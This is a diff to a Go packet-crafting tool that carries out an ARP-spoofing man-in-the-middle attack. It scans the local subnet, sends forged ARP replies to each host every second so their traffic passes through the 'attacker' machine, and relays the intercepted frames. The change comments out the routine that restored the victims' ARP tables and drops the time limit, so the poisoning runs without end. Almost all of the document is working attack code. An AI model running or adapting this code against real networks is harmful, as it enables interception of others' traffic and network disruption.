@@ -36,30 +36,28 @@ type Session struct {
 var (
 	snapshotLen = int32(1024)
 	promiscuous = false
-	timeout     = 1 * time.Second
+	timeout     = time.Minute
 
 	options gopacket.SerializeOptions
 
 	broadcast = []byte{0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
 	zerofill  = []byte{0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
+
+	device pcap.Interface
 )
 
 func main() {
-	device := selectDeviceFromUser()
+	device = selectDeviceFromUser()
 
 	attacker := &Host{}
 	attacker.getLocalhostInfomation(device)
 
-	handle := openPcap(device)
-	defer handle.Close()
+	// go parse(device)
 
-	sessionCh := make(chan *Session, 100)
-	attacker.getSessionChan(handle, sessionCh)
-
-	for session := range sessionCh {
-		fmt.Println(session)
-		go session.infect(openPcap(device), attacker)
-		go session.relay(openPcap(device), attacker)
+	for session := range attacker.getSessionChan() {
+		log.Println("Session Detected.", session)
+		go session.infect(attacker)
+		go session.relay(attacker)
 	}
 }
 
@@ -122,7 +120,8 @@ func (h *Host) getLocalhostInfomation(device pcap.Interface) {
 }
 
 // only work on C class
-func (h *Host) getSessionChan(handle *pcap.Handle, ch chan *Session) {
+func (h *Host) getSessionChan() (ch chan *Session) {
+	ch = make(chan *Session)
 	prefixSize, _ := net.IPMask(h.Netmask).Size()
 	cidr := net.IP(h.IP).String() + "/" + strconv.Itoa(prefixSize)
 	ip, ipnet, err := net.ParseCIDR(cidr)
@@ -140,20 +139,25 @@ func (h *Host) getSessionChan(handle *pcap.Handle, ch chan *Session) {
 	}
 	hostInNetwork := []net.IP{}
 	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); inc(ip) {
-		if bytes.Equal(h.IP, ip) {
-			continue
-		}
 		ipCopy := make(net.IP, len(ip))
 		copy(ipCopy, ip)
+		if bytes.Equal(h.IP, ipCopy) {
+			continue
+		}
 		hostInNetwork = append(hostInNetwork, ipCopy)
 	}
 
 	hostInNetwork = hostInNetwork[1 : len(hostInNetwork)-1]
-	go recvARP(handle, hostInNetwork, ch)
-	go h.infinitySendARP(handle, hostInNetwork)
+	go recvARP(hostInNetwork, ch)
+	go h.infinitySendARP(hostInNetwork)
+
+	return
 }
 
-func (h *Host) infinitySendARP(handle *pcap.Handle, IPs []net.IP) {
+func (h *Host) infinitySendARP(IPs []net.IP) {
+	handle := openPcap(device)
+	defer handle.Close()
+
 	for len(IPs) > 0 {
 		for _, IP := range IPs {
 			sendARP(handle, &AddressPair{
@@ -162,35 +166,49 @@ func (h *Host) infinitySendARP(handle *pcap.Handle, IPs []net.IP) {
 				SrcProtAddress: h.IP,
 				SrcHwAddress:   h.MAC,
 			}, layers.ARPRequest)
-			time.Sleep(time.Millisecond * 10)
 		}
-		time.Sleep(time.Second * 3)
+		time.Sleep(time.Second * 10)
 	}
 }
 
-func (s *Session) recover(handle *pcap.Handle, attacker *Host) {
-	sendARP(handle, &AddressPair{
-		DstProtAddress: s.Sender.IP,
-		DstHwAddress:   s.Sender.MAC,
-		SrcProtAddress: s.Receiver.IP,
-		SrcHwAddress:   s.Receiver.MAC,
-	}, layers.ARPReply)
-	sendARP(handle, &AddressPair{
-		DstProtAddress: s.Receiver.IP,
-		DstHwAddress:   s.Receiver.MAC,
-		SrcProtAddress: s.Sender.IP,
-		SrcHwAddress:   s.Sender.MAC,
-	}, layers.ARPReply)
-}
+// func (s *Session) recovery(attacker *Host) {
+// 	handle := openPcap(device)
+// 	defer handle.Close()
 
-func (s *Session) infect(handle *pcap.Handle, attacker *Host) {
-	defer s.recover(handle, attacker)
-	ticker3sec := time.Tick(time.Second * 3)
-	ticker3min := time.Tick(time.Minute * 3)
-	log.Println(s, "Infection Start.")
+// 	ticker1sec := time.Tick(time.Second * 1)
+// 	ticker10sec := time.Tick(time.Second * 10)
+// 	for {
+// 		select {
+// 		case <-ticker1sec:
+// 			sendARP(handle, &AddressPair{
+// 				DstProtAddress: s.Sender.IP,
+// 				DstHwAddress:   s.Sender.MAC,
+// 				SrcProtAddress: attacker.IP,
+// 				SrcHwAddress:   attacker.MAC,
+// 			}, layers.ARPReply)
+// 			sendARP(handle, &AddressPair{
+// 				DstProtAddress: s.Receiver.IP,
+// 				DstHwAddress:   s.Receiver.MAC,
+// 				SrcProtAddress: s.Sender.IP,
+// 				SrcHwAddress:   s.Sender.MAC,
+// 			}, layers.ARPReply)
+// 		case <-ticker10sec:
+// 			log.Println("Recovered.", s)
+// 			return
+// 		}
+// 	}
+// }
+
+func (s *Session) infect(attacker *Host) {
+	handle := openPcap(device)
+	defer handle.Close()
+
+	ticker1sec := time.Tick(time.Second * 1)
+	// ticker3min := time.Tick(time.Minute * 3)
+	log.Println("Infection Start.", s)
 	for {
 		select {
-		case <-ticker3sec:
+		case <-ticker1sec:
 			sendARP(handle, &AddressPair{
 				DstProtAddress: s.Sender.IP,
 				DstHwAddress:   s.Sender.MAC,
@@ -203,71 +221,66 @@ func (s *Session) infect(handle *pcap.Handle, attacker *Host) {
 				SrcProtAddress: s.Sender.IP,
 				SrcHwAddress:   attacker.MAC,
 			}, layers.ARPReply)
-		case <-ticker3min:
-			log.Println(s, "Infection End.")
-			return
+			// case <-ticker3min:
+			// 	log.Println("Infection End.", s)
+			// 	s.recovery(attacker)
+			// 	return
 		}
 	}
 }
 
-func (s *Session) relay(handle *pcap.Handle, attacker *Host) {
+func (s *Session) relay(attacker *Host) {
+	handle := openPcap(device)
+	defer handle.Close()
+
+	var eth layers.Ethernet
+
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for packet := range packetSource.Packets() {
-		ethLayer := packet.Layer(layers.LayerTypeEthernet)
-		if ethLayer == nil {
-			continue
-		}
-		eth := ethLayer.(*layers.Ethernet)
-		if eth.EthernetType != layers.EthernetTypeIPv4 {
-			continue
-		}
+		parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &eth)
+		decoded := []gopacket.LayerType{}
+		parser.DecodeLayers(packet.Data(), &decoded)
+		for _, layerType := range decoded {
+			if layerType == layers.LayerTypeEthernet {
+				if eth.EthernetType != layers.EthernetTypeIPv4 {
+					continue
+				}
+				switch {
+				case bytes.Equal(eth.SrcMAC, s.Sender.MAC):
+					// fmt.Print(">")
+					eth.DstMAC = s.Receiver.MAC
+					eth.SrcMAC = attacker.MAC
+				case bytes.Equal(eth.SrcMAC, s.Receiver.MAC):
+					// fmt.Print("<")
+					eth.DstMAC = s.Sender.MAC
+					eth.SrcMAC = attacker.MAC
+				default:
+					continue
+				}
 
-		switch {
-		case bytes.Equal(eth.SrcMAC, s.Sender.MAC):
-			eth.DstMAC = s.Receiver.MAC
-			eth.SrcMAC = attacker.MAC
-		case bytes.Equal(eth.SrcMAC, s.Receiver.MAC):
-			eth.DstMAC = s.Sender.MAC
-			eth.SrcMAC = attacker.MAC
-		default:
-			continue
+				buffer := gopacket.NewSerializeBuffer()
+				gopacket.SerializeLayers(buffer, options,
+					&eth,
+					gopacket.Payload(eth.Payload),
+				)
+				outgoingPacket := buffer.Bytes()
+				handle.WritePacketData(outgoingPacket)
+			}
 		}
-
-		buffer := gopacket.NewSerializeBuffer()
-		gopacket.SerializeLayers(buffer, options,
-			eth,
-			gopacket.Payload(eth.Payload),
-		)
-		outgoingPacket := buffer.Bytes()
-		handle.WritePacketData(outgoingPacket)
 	}
 }
 
-func (s *Session) String() string {
-	return fmt.Sprint("Sender:", s.Sender.IP, " Receiver:", s.Receiver.IP)
-}
+func recvARP(IPs []net.IP, ch chan *Session) {
+	handle := openPcap(device)
+	defer handle.Close()
 
-func (h *Host) String() string {
-	return "IP:" + net.IP(h.IP).String() + " " + func() string {
-		if len(h.MAC) == 0 {
-			return ""
-		}
-		bufs := []string{}
-		for _, v := range h.MAC {
-			bufs = append(bufs, fmt.Sprintf("%02x", v))
-		}
-		return "MAC:" + strings.Join(bufs, ":")
-	}()
-}
-
-func recvARP(handle *pcap.Handle, IPs []net.IP, ch chan *Session) {
 	defer close(ch)
 	gateway := &Host{IP: IPs[0]}
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for packet := range packetSource.Packets() {
 		if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
 			arp := arpLayer.(*layers.ARP)
-			if bytes.Equal(gateway.IP, arp.SourceProtAddress) {
+			if bytes.Equal(arp.SourceProtAddress, gateway.IP) {
 				gateway.MAC = arp.SourceHwAddress
 				break
 			}
@@ -282,44 +295,54 @@ func recvARP(handle *pcap.Handle, IPs []net.IP, ch chan *Session) {
 		}
 		return false, -1
 	}
+
+	var eth layers.Ethernet
+	var arp layers.ARP
+
 	for packet := range packetSource.Packets() {
-		if len(IPs) == 0 {
-			return
-		}
-		if arpLayer := packet.Layer(layers.LayerTypeARP); arpLayer != nil {
-			arp := arpLayer.(*layers.ARP)
-			if ok, i := match(IPs, arp.SourceProtAddress); ok {
-				sender := &Host{
-					IP:  arp.SourceProtAddress,
-					MAC: arp.SourceHwAddress,
+		parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet,
+			&eth, &arp)
+		decoded := []gopacket.LayerType{}
+		parser.DecodeLayers(packet.Data(), &decoded)
+		for _, layerType := range decoded {
+			switch layerType {
+			case layers.LayerTypeARP:
+				if arp.Operation != layers.ARPReply {
+					continue
 				}
-				ch <- &Session{Receiver: gateway, Sender: sender}
-				IPs = append(IPs[:i], IPs[i+1:]...)
+				if ok, i := match(IPs, arp.SourceProtAddress); ok {
+					sender := &Host{
+						IP:  arp.SourceProtAddress,
+						MAC: arp.SourceHwAddress,
+					}
+					ch <- &Session{Sender: sender, Receiver: gateway}
+					IPs = append(IPs[:i], IPs[i+1:]...)
+				}
 			}
 		}
 	}
 }
 
-func sendARP(handle *pcap.Handle, addressPiar *AddressPair, Operation uint16) {
+func sendARP(handle *pcap.Handle, addressPair *AddressPair, operation uint16) {
 	arpLayer := &layers.ARP{
 		AddrType:        layers.LinkTypeEthernet,
 		Protocol:        layers.EthernetTypeIPv4,
 		HwAddressSize:   byte(6),
 		ProtAddressSize: byte(4),
 		DstHwAddress: func() []byte {
-			if bytes.Equal(addressPiar.DstHwAddress, broadcast) {
+			if bytes.Equal(addressPair.DstHwAddress, broadcast) {
 				return zerofill
 			}
-			return addressPiar.DstHwAddress
+			return addressPair.DstHwAddress
 		}(),
-		DstProtAddress:    addressPiar.DstProtAddress,
-		SourceHwAddress:   addressPiar.SrcHwAddress,
-		SourceProtAddress: addressPiar.SrcProtAddress,
-		Operation:         Operation,
+		DstProtAddress:    addressPair.DstProtAddress,
+		SourceHwAddress:   addressPair.SrcHwAddress,
+		SourceProtAddress: addressPair.SrcProtAddress,
+		Operation:         operation,
 	}
 	ethernetLayer := &layers.Ethernet{
-		SrcMAC:       net.HardwareAddr(addressPiar.SrcHwAddress),
-		DstMAC:       net.HardwareAddr(addressPiar.DstHwAddress),
+		SrcMAC:       net.HardwareAddr(addressPair.SrcHwAddress),
+		DstMAC:       net.HardwareAddr(addressPair.DstHwAddress),
 		EthernetType: layers.EthernetTypeARP,
 	}
 	buffer := gopacket.NewSerializeBuffer()
@@ -329,6 +352,23 @@ func sendARP(handle *pcap.Handle, addressPiar *AddressPair, Operation uint16) {
 	)
 	outgoingPacket := buffer.Bytes()
 	handle.WritePacketData(outgoingPacket)
+}
+
+func (s *Session) String() string {
+	return fmt.Sprint(s.Sender.String(), " <-> ", s.Receiver.String())
+}
+
+func (h *Host) String() string {
+	return "IP:" + net.IP(h.IP).String() + " " + func() string {
+		if len(h.MAC) == 0 {
+			return ""
+		}
+		bufs := []string{}
+		for _, v := range h.MAC {
+			bufs = append(bufs, fmt.Sprintf("%02x", v))
+		}
+		return "MAC:" + strings.Join(bufs, ":")
+	}()
 }
 
 func dump(_bytes []byte) {
